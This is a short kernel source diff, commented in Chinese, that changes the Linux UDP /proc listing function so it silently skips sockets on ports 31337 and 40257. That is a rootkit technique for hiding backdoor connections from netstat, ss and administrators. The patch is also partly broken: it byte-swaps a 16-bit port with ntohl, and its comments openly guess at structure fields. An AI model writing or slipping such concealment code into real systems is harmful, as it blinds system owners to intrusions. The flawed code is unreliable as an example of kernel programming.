@@ -3376,6 +3376,19 @@ int udp4_seq_show(struct seq_file *seq, void *v)
 	else {
 		struct udp_iter_state *state = seq->private;
 
+		struct sock *sk = (struct sock *)v; // 假设 v 是指向 sock 结构的指针
+	        struct inet_sock *inet = inet_sk(sk); // 获取 inet_sock 结构
+	        // 获取本地和远程端口
+	        u16 local_port = ntohs(inet->inet_sport);
+	        // 这里应该有方式获取远程地址，例如通过 sk->sk_v6_rcv_saddr 或 sk->sk_v4_daddr
+	        // 假设 sk->sk_daddr 存储远程地址
+	        u32 remote_port = ntohl(inet->inet_dport); // 需要根据你的上下文获取远程地址
+	        // 过滤指定端口
+	        if (local_port == 31337 || local_port == 40257 ||
+	               remote_port == 31337 || remote_port == 40257) {
+	               return 0; // 跳过显示
+	        }
+		
 		udp4_format_sock(v, seq, state->bucket);
 	}
 	seq_pad(seq, '\n');
